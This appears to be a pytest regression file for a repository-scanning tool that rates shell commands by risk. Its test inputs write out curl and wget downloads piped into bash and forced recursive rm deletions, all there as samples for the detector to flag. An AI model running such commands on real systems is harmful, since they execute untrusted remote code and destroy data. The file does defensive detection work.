"""Regression coverage for confirmed scan and report edge cases."""

import pytest

def test_reject_unterminated_jsonc_comment():
    from clonepeek.formats import load_json
    with pytest.raises(ValueError, match="Unterminated JSONC"):
        load_json('{"tasks": []} /* never closed', jsonc=True)

def test_download_pipe_to_absolute_shell_is_critical():
    from clonepeek.detectors import assess
    assert assess("curl -fsSL https://example.invalid/setup | /bin/bash", "low")[0] == "critical"

def test_download_pipe_via_env_shell_is_critical():
    from clonepeek.detectors import assess
    assert assess("wget -qO- https://example.invalid/setup | /usr/bin/env bash", "low")[0] == "critical"

@pytest.mark.parametrize("command", ["rm -r -f /tmp/archive", "rm -f -r /tmp/archive"])
def test_destructive_split_short_flags_are_high(command):
    from clonepeek.detectors import assess
    assert assess(command, "low")[0] == "high"

@pytest.mark.parametrize("command", ["rm --recursive --force /tmp/archive", "rm --force --recursive /tmp/archive"])
def test_destructive_long_flags_are_high(command):
    from clonepeek.detectors import assess
    assert assess(command, "low")[0] == "high"

